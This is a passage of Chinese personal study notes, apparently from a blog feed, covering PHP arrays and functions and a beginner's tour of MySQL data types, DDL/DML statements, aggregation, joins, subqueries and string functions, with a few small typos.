class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token double-quoted-string string">"lxj"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Augenstern"</span><span class="token punctuation">,</span>    <span class="token number">0258</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">8520</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"lxj"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"zxcv0221"</span><span class="token punctuation">;</span><span class="token comment">//修改数组值</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"wkx"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"wangkaixin"</span><span class="token punctuation">;</span><span class="token comment">//增加一个数组值</span><span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"wkx"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除wkx这个key和其对应的值</span><span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除整个数组</span><span class="token delimiter important">?></span></span></code></pre><p>清晰明了。数组学习暂时到这里。</p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="用户自定义函数"><a href="#用户自定义函数" class="headerlink" title="用户自定义函数"></a>用户自定义函数</h2><p>函数如何定义：要定义一个函数，在PHP里面要先加上function关键词<br>下面看一个伪代码（不能运行）函数的例子：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>php<span class="token comment">//这是一段伪代码，为了直观的介绍函数的简单定义而已。</span><span class="token keyword">function</span> <span class="token function">lxj</span><span class="token punctuation">(</span><span class="token variable">$var_1</span><span class="token punctuation">,</span> <span class="token variable">$var_2</span><span class="token punctuation">,</span> <span class="token variable">$var_3</span><span class="token punctuation">,</span><span class="token comment">/*,,,,,,*/</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"伪代码\n"</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//此代码不能运行</span><span class="token delimiter important">?></span></span></code></pre><p>函数名称自己定义，但是也不是随便，命名规则：有效的函数名以字母或下划线打头，后面跟字母，数字或下划线。<br>任何有效的PHP代码都有可能出现在函数内部，甚至包含其他函数和类的定义。1.函数无需在调用之前被定义，除非是下面的函数是有条件的被定义。2.当一个函数是有条件被定义时，必须在调用函数之前定义。看个例子：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$makelizi</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span><span class="token function">lizi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//lizi函数还不能调用，因为它还不存在</span><span class="token function">lxj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//但是bar函数可以调用，因为bar函数不是有条件的函数。</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$makelizi</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">function</span> <span class="token function">lizi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"lalala\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//可以调用lizi函数了，因为$makelizi的值为真了。</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$makelizi</span><span class="token punctuation">)</span> <span class="token function">lizi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">lxj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"xixixi\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>这个代码是可以跑的，自己跑一下对比更明显，理解更清楚。<br>再来一个函数套函数的代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">lxj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">function</span> <span class="token function">wkx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"nice,xiongdei\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//这里不能直接调用wkx函数，因为他还不存在。可以理解为没有被定义。</span><span class="token function">lxj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//现在就可以调用wkx函数了，因为lxj函数被执行了，使得wkx函数被定义。</span><span class="token function">wkx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>介绍都在代码中注释了。PHP中的所有函数都具有全局作用域，可以定义在一个函数之内而在函数外面调用。相反也可以。PHP不支持函数重载，也不可能取消定义或者重定义已经声明过的函数。<br>注意：函数名是大小与大小写无关的，不过尽量写成一样的，养成一个好习惯。<br>递归函数：<br>PHP中还可以调用递归函数，还是来个代码看看</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">lxj</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"lalala\n"</span><span class="token punctuation">;</span><span class="token function">lxj</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">lxj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>递归函数的调用要注意的是避免调用超过100-200层，因为可能会堆栈崩溃从而使当前脚本终止。无限递归可视为编程错误。</p><h2 id="函数的参数"><a href="#函数的参数" class="headerlink" title="函数的参数"></a>函数的参数</h2><p>函数的参数可以不填，使其默认参数起作用，也可以传参。<br>先看个通过引用办法传参的代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">lxj</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$string</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token double-quoted-string string">"或者其他的"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"这是一个字符串,"</span><span class="token punctuation">;</span><span class="token function">lxj</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token comment">//输出结果：这是一个字符串,或者其他的[Finished in 0.1s]</span><span class="token delimiter important">?></span></span></code></pre><p>或者直接传递参数，覆盖默认值</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">lxj</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">lxj</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//运行结果：45[Finished in 0.1s]</span><span class="token delimiter important">?></span></span></code></pre><p>先总结到这里，下次接着学习没学完的函数。</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP从零开始——学习笔记(4)</title>
      <link href="/posts/e44de088/"/>
      <url>/posts/e44de088/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql快速入门"><a href="#mysql快速入门" class="headerlink" title="mysql快速入门"></a>mysql快速入门</h1><h2 id="数据库基本概念"><a href="#数据库基本概念" class="headerlink" title="数据库基本概念"></a>数据库基本概念</h2><p>之前了解过一点点数据库的概念，所以到这里学习这一小节会比较轻松。</p><p>一、数据库的基本概念</p><p>​    <strong>数据库</strong>：信息存储的仓库，包括一系列的关系措施</p><p>​    <strong>表</strong>：一个数据库中可以有若干张表（形势上你可以看出我们日常生活中建立的表）</p><p>​    <strong>字段</strong>：表里面的信息会分成若干个栏目来存，这些栏目在数据库技术中的名称叫做“字段”，栏目里面存的具体信息叫字段值</p><p>​    <strong>记录</strong>：一条信息叫做一条记录</p><p>一个数据库管理系统中可以建立若干个数据库，每个数据库中又可以建立若干张表，每张表中可以有若干条记录。</p><h2 id="MySQL支持的数据类型"><a href="#MySQL支持的数据类型" class="headerlink" title="MySQL支持的数据类型"></a>MySQL支持的数据类型</h2><p>为了对不同性质的数据进行区分，以提高数据查询和操作的效率，数据库系统将可以存入的数据分为多种类型。MySQL数据库中的数据类型分为三大类：数值类型、日期类型、字符串类型。</p><p>1.<strong>数值类型</strong></p><p>在整数类型中，按照取值范围和存储方式不同，分为tinyint、smallint、mediumint、int和bigint这5个类型。</p><p>2.<strong>日期类型</strong></p><p>日期和时间类型</p><p>date、datetime、timestamp、time、year。</p><p>datetime是常用的日期类型。如：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">create table j4y(dt datetime);insert into j4y values(now());</code></pre><p>3.<strong>字符串类型</strong></p><p>  字符串类型 描述</p><p>  <strong>CHAR</strong>(M)     M为0~255之间的整数,表示可以存M个字符</p><p>  <strong>VARCHAR</strong>(M)     M为0~65535之间的整数,表示可以存M个字符</p><p>  <strong>TINYTEXT</strong>    允许长度0~255字符</p><p>  <strong>TEXT</strong>     允许长度0~65535字符</p><p>  <strong>MEDIUMTEXT</strong>     允许长度0~167772150字符</p><p>  <strong>LONGTEXT</strong>     允许长度0~42949667295字符</p><p><strong>BINARY</strong>(M) 允许长度0~M个字节的定长字节字符串(类似于CHAR类型，但保存二进制字节字符串而不是非二进制字符串)</p><p>  <strong>VARBINARY</strong>(M) 允许长度0~M个字节的变长字节字符串类型类似于VARCHAR类型，但保存二进制字节字                   符串而不是非二进制字符串。</p><p>  <strong>TINYBLOB</strong> 允许长度0~255字节的BLOB列(保存二进制字节字符串)</p><p>  <strong>BLOB</strong> 允许长度0~65535字节的BLOB列(保存二进制字节字符串)</p><p>  <strong>MEDIUMBLOB</strong> 允许长度0~167772150字节的BLOB列(保存二进制字节字符串)</p><p>  <strong>LONGBLOB</strong>允许长度0~4294967295字节的BLOB列(保存二进制字节字符串)</p><p>  <strong>ENUM</strong> 枚举类型</p><p>  <strong>SET</strong> SET类型</p><p>  <strong>字符串类型详细说明：</strong>   </p><p>  1)char和varchar类型</p><p>​    char与varchar很类似，都用来保存MySQL中较短字符串。</p><p>​    区别：char列的长度固定位创建表时声明的长度，长度可以为0~255的任何值；</p><p>​                varchar列中的值为可变长字符串，长度可以指定为0<del>65535（MySQL5.0.3版本以前为0</del>255）之间的值。</p><p>​                在检索时，char列删除尾部的空格，而varchar则保留这些空格。</p><p>​    create table j4y(v varchar(4),c char(4));</p><p>​    insert into j4y values(‘ab ‘,’ab ‘);</p><p>​    select length(v),length(c) from t1;</p><p>​    select concat(v,’+’),concat(c,’+’) from vc;</p><p>​    选择：由于char是固定长度，所以它的处理速度比varchar快，但是缺点是浪费存储空间。所以对于那些长度变化不大的数据可以选择此列</p><p>  2)text类型</p><p>​    保存少量字符串的时候，我们会选择char或者varchar，保存大文本的时候通常会选择使用text。</p><p>  3)blob类型</p><p>​    blob类型也是用来保存比较大量的字符串的名单是blob类型是用来保存二进制数据的比如照片。</p><p>  2)ENUM类型</p><p>​    枚举类型，它的值范围需要在创建表时通过枚举方式显式指定，对1<del>255个成员的枚举需要1个字节存储；对于255</del>65535个成员，需要2个</p><p>​    字节存储。最多有65535个成员。</p><p>​    create table j4y(flag enum(‘a’,’b’,’c’,’d’));</p><p>​    insert into j4y values(‘a’),(‘a’),(‘f’);</p><p>​    往enum类型里存储数据是<strong>忽略大小写</strong>的，对于插入不在enum指定范围内的值时，并没有返回警告，而是插入了enum的第一个值。</p><p>​    另外enum类型只允许从值集合中选取单个值，而不能一次取多个值</p><p>  3)SET类型</p><p>​    set和enum类型非常类似，也是一个字符串对象，里面可以包含0~64个成员。根据成员的不同，存储上也有所不同。</p><p>​    1~8成员的集合，占1个字节</p><p>​    9~16成员的集合，占2个字节</p><p>​    17~24成员的集合，占3个字节</p><p>​    25~32成员的集合，占4个字节</p><p>​    33~64成员的集合，占8个字节</p><p>​    create table t1(flag set(‘a’,’b’,’c’,’d’));</p><p>​    insert into t1 values(‘a,b’),(‘a,d,a’);</p><p>​    SET类型可以从允许值集合中选择任意1个或多元素进行组合，所以对于输出的值只要在允许的组合范围内，都可以正确地注入到set类型的</p><p>​    列中。</p><p>​    对于超出允许值范围的值，将<strong>不允许注入</strong>，对于包含重复的成员的集合将<strong>只取一次进行注入</strong>。</p><p>​    使用FIND_IN_SET函数对set类型的数据进行查询是比较好的选择!</p><h2 id="MySQL使用入门"><a href="#MySQL使用入门" class="headerlink" title="MySQL使用入门"></a>MySQL使用入门</h2><h3 id="SQL分类"><a href="#SQL分类" class="headerlink" title="SQL分类"></a>SQL分类</h3><h4 id="DDL语句"><a href="#DDL语句" class="headerlink" title="DDL语句"></a>DDL语句</h4><p>操作之前首先登录mysql。</p><p><code>mysql -u 用户名 -p</code>回车然后输入密码登录。（有密码输密码，无密码直接回车）</p><p>1）DDL(Data Definition Languages)语句</p><p>​      数据定义语句，通过这类语言可以对数据库进行创建删除更改。</p><p>登录mysql，对数据库进行操作。</p><p>1&gt;<code>show databases;</code>查看所有数据库</p><pre class="language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">--------------------+</span><span class="token operator">|</span> <span class="token keyword">Database</span>           <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">--------------------+</span><span class="token operator">|</span> information_schema <span class="token operator">|</span><span class="token operator">|</span> challenges         <span class="token operator">|</span><span class="token operator">|</span> dvwa               <span class="token operator">|</span><span class="token operator">|</span> mysql              <span class="token operator">|</span><span class="token operator">|</span> performance_schema <span class="token operator">|</span><span class="token operator">|</span> security           <span class="token operator">|</span><span class="token operator">|</span> test               <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">--------------------+</span></code></pre><p>2&gt;<code>create database 数据库名;</code>创建一个数据库（数据库名自定义）</p><pre class="language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">create</span> <span class="token keyword">database</span> lxj<span class="token punctuation">;</span>Query OK<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token keyword">row</span> affected <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></code></pre><p>3&gt;<code>drop database 数据库名;</code>删除数据库</p><p>4&gt;创建表、字段。删除表、字段。等等这些基本操作就不在叙述，之前总结过了。只添加一些补充内容。</p><p>5&gt;查看表：<code>desc 表名</code></p><pre class="language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">desc</span> j4y<span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">-------+---------+------+-----+---------+-------+</span><span class="token operator">|</span> Field <span class="token operator">|</span> <span class="token keyword">Type</span>    <span class="token operator">|</span> <span class="token boolean">Null</span> <span class="token operator">|</span> <span class="token keyword">Key</span> <span class="token operator">|</span> <span class="token keyword">Default</span> <span class="token operator">|</span> Extra <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">-------+---------+------+-----+---------+-------+</span><span class="token operator">|</span> id1   <span class="token operator">|</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">|</span> YES  <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token boolean">NULL</span>    <span class="token operator">|</span>       <span class="token operator">|</span><span class="token operator">|</span> id2   <span class="token operator">|</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">|</span> YES  <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token boolean">NULL</span>    <span class="token operator">|</span>       <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">-------+---------+------+-----+---------+-------+</span><span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></code></pre><p>第二种方式：<code>show create table 表名 \G</code>最后无分号。</p><pre class="language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">show</span> <span class="token keyword">create</span> <span class="token keyword">table</span> j4y \G<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span> <span class="token number">1.</span> <span class="token keyword">row</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>       <span class="token keyword">Table</span>: j4y<span class="token keyword">Create</span> <span class="token keyword">Table</span>: <span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>j4y<span class="token punctuation">`</span> <span class="token punctuation">(</span>  <span class="token punctuation">`</span>id1<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>id2<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span>MyISAM <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></code></pre><p>说明：<code>\G</code>选项使得记录能够按照字段竖向排列，以便更好地显示内容较长的记录。</p><p>6&gt; 修改表</p><p>1)修改表的字段类型</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">alter table 表名 modify [column] 字段定义 [first|after 字段名];</code></pre><p>举个栗子</p><p>2)增加表字段</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">alter table 表名 add [column] 字段定义 [first|after 字段名];</code></pre><p>3)删除表字段</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">alter table 表名 drop [column] 字段名;</code></pre><p>4)字段改名</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">alter table 表名 change [column] 旧的字段名 新字段定义 [first|after 字段名];</code></pre><p>举个例子：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; alter table j4y add column id3 int;Query OK, 0 rows affected (0.04 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; alter table j4y change column id2 Augenstern int;Query OK, 0 rows affected (0.01 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; desc j4y;+------------+------------+------+-----+---------+-------+| Field      | Type       | Null | Key | Default | Extra |+------------+------------+------+-----+---------+-------+| id1        | tinyint(4) | YES  |     | NULL    |       || Augenstern | int(11)    | YES  |     | NULL    |       || id3        | int(11)    | YES  |     | NULL    |       |+------------+------------+------+-----+---------+-------+3 rows in set (0.00 sec)</code></pre><ol start="5"><li>修改字段排列顺序</li></ol><pre class="language-mysql" data-language="mysql"><code class="language-mysql">alter table j4y modify id1 tinyint first;&#x2F;&#x2F;移动到第一位alter table j4y modify id3 int after id1;&#x2F;&#x2F;移动到指定位置后面</code></pre><p>6)更改表名</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">alter table 表名 rename [to] 新的表名;</code></pre><h4 id="DML语句"><a href="#DML语句" class="headerlink" title="DML语句"></a>DML语句</h4><p>DML操作是指对数据库中表记录的操作，主要包括表记录的插入、更新、删除、和查询。</p><ol><li>插入记录</li></ol><pre class="language-mysql" data-language="mysql"><code class="language-mysql">insert into 表名(字段1,字段2,字段3,....,字段n) values(相对应的内容)</code></pre><p>栗子：</p><pre class="language-my" data-language="my"><code class="language-my">mysql&gt; insert into admin(id,lxj,j4y) values(01,456,789);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from admin;+------+------+------+| id   | lxj  | j4y  |+------+------+------+|    1 |  456 |  789 |+------+------+------+1 row in set (0.00 sec)</code></pre><p>字段名可不写。</p><p>一次性插入多条记录，：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; insert into admin(id,lxj,j4y) values    -&gt; (2,564,446),    -&gt; (3,580,541),    -&gt; (4,965,315);Query OK, 3 rows affected (0.00 sec)Records: 3  Duplicates: 0  Warnings: 0mysql&gt; select * from admin;+------+------+------+| id   | lxj  | j4y  |+------+------+------+|    1 |  456 |  789 ||    2 |  564 |  446 ||    3 |  580 |  541 ||    4 |  965 |  315 |+------+------+------+4 rows in set (0.00 sec)</code></pre><ol start="2"><li>更新记录</li></ol><p>更新一个表</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">update 表名 set 字段1&#x3D;值1,字段2&#x3D;值2,....,字段n&#x3D;值n where [限制条件];</code></pre><p>更新多个表</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">update 表1,表2,...表n set 表1.字段1&#x3D;表达式1,表n.字段n&#x3D;表达式n [where 条件];</code></pre><ol start="3"><li>删除记录</li></ol><p>删除一个表中的数据</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">delete from 表名 [where 条件];</code></pre><p>输出多个表中的数据</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">delete 表1,表2,...表n from 表1,表2,...表n [where 条件];</code></pre><ol start="4"><li>查询记录</li></ol><p>一、查询不重复的记录</p><p>SELECT distinct field1,field2 FROM 表名;<br>只要field1,field2任何一个字段有不同就会被选择！<br>一般使用distinct,只筛选一个字段!</p><p>二、</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">=</span><span class="token punctuation">,</span><span class="token operator">&lt;</span><span class="token punctuation">,</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token operator">>=</span><span class="token punctuation">,</span><span class="token operator">&lt;=</span><span class="token punctuation">,</span><span class="token operator">!=</span>等比较运算符多个条件之间可以使用<span class="token operator">or</span> <span class="token operator">and</span>等<span class="token keyword">where</span> 后面接条件<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> 表名 <span class="token keyword">where</span> 条件</code></pre><p>三、排序</p><p>asc:由低到高，也是默认值</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select * from 表名 order by 字段名 asc;</code></pre><p>如：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select * from admin order by id asc;+------+------+------+| id   | lxj  | j4y  |+------+------+------+|    1 |  456 |  789 ||    2 |  564 |  446 ||    3 |  580 |  541 ||    4 |  965 |  315 |+------+------+------+4 rows in set (0.00 sec)</code></pre><p>desc:由高到底</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select * from 表名 order by 字段名 desc;</code></pre><p>多个字段排序</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select * from 表名 order by 字段名1 desc,字段名2 desc;</code></pre><p>四、聚合</p><p>①sum求和<br><code>select sum(字段名) from 表名;</code><br>②count记录总数<br><code>select count(*|字段名) from 表名;</code><br>③max最大值<br><code>select max(字段名) from 表名;</code><br>④min最小值<br><code>select min(字段名) from 表名;</code><br>⑤GROUP BY分类聚合<br><code>select department,sum(salary) from employee group by department;</code><br>⑥WITH ROLLUP分类聚合后的结果进行再汇总<br><code>select sum(salary) from employee group by department with rollup;</code><br>⑦HAVING<br>注意：having和where的区别在于，having是对聚合后的结果进行条件过滤，而where是在聚合前就对记录进行过滤 ，应该尽可能的对记录进行先过滤！<br><code>select sum(salary) from employee group by department having sum(salary)&gt;1000;</code><br>在一起使用：<code>select sum(id),max(id),min(id),count(*) from a1;</code></p><p>五、表连接</p><p>需求：显示多个表中的字段的时候即可使用表连接</p><p>连接分类</p><p>内连接：选取两张表中相互匹配的记录</p><p><code>select 表.字段,....  from 表1名,表2名,...  where [匹配的条件比如 表1.字段=表2.字段];</code></p><p>外连接：不仅仅选取两张相互匹配的记录，并且会选出其他不匹配的记录</p><ul><li>左连接</li></ul><p>概念：包含左边表中的所有记录(包括右表中没有和它匹配的记录)</p><ul><li>右连接</li></ul><p>概念：包含右边表中的所有记录(包括左表中没有和它匹配的记录)<br>左连接和右连接是可以相互转换的！</p><p>六、子查询</p><p>需求：一个查询需要另外一个查询的结果参与的时候</p><p>用于子查询的关键字:</p><p>①：in</p><p>使用语法：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select * from 表名1 where id in(select 字段名 from 表名2);</code></pre><p>in 在..里面<br>注意点 in后面的子语句必须只返回一个字段<br>若查询结果唯一(只有一条)可以使用=代替in</p><p>②：not in</p><p>与in相反</p><p>③：exists</p><p>使用语法：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select语句 where exists(select 语句);</code></pre><p>exists：后面那个子语句有没有查询出记录来，如果查询出记录来返回true,否则就是false,并且查询出来的记录的具体的值是NULL也是没有关系,也是返回true.</p><p>④：not exists</p><p>与exists相反</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select * from 表名1 where 表名2 in(select 表名2 from 字段名);</code></pre><p>若查询结果唯一可以使用=代替in</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select * from 表明1 where 表名2&#x3D;(select 表名2 from 字段名 limit 1);</code></pre><p>七、记录联合</p><p>我们常常会碰到需要将两个表或者多个表的数据按照一定的查询条件查询出来后，将结果合并到一起显示这是就需要用到记录联合<br>多个select 语句用<br>UNION或者UNION ALL隔开即可实现<br>区别： 前者 会将多个查询结果合并后并且进行去除重复后返回<br>后者 则直接合并并不去除重复<br>联合的条件：查询的列个数要相等</p><h2 id="MySQL中的常用函数"><a href="#MySQL中的常用函数" class="headerlink" title="MySQL中的常用函数"></a>MySQL中的常用函数</h2><ol><li>字符串函数</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">CONCAT<span class="token punctuation">(</span>S1,S2,<span class="token punctuation">..</span>.Sn<span class="token punctuation">)</span>连接S1,S2,<span class="token punctuation">..</span>.Sn为一个字符串  INSERT<span class="token punctuation">(</span>str,x,y,instr<span class="token punctuation">)</span>将字符串str从第x位置开始，y个字符长的字符串换位字符串instr  LOWER<span class="token punctuation">(</span>str<span class="token punctuation">)</span>将字符串str中所有字符变为小写  UPPER<span class="token punctuation">(</span>str<span class="token punctuation">)</span>将字符串str中所有字符变为大写  LEFT<span class="token punctuation">(</span>str,x<span class="token punctuation">)</span>返回字符串str最右边的x个字符  RIGHT<span class="token punctuation">(</span>str,x<span class="token punctuation">)</span>返回字符串str最右边的x个字符  LPAD<span class="token punctuation">(</span>str,n,pad<span class="token punctuation">)</span>用字符串pad对str最左边进行填充，直到长度为n个字符长度  RPAD<span class="token punctuation">(</span>str,n,pad<span class="token punctuation">)</span>用字符串pad对str最右边进行填充，直到长度为n个字符长度  LTRIM<span class="token punctuation">(</span>str<span class="token 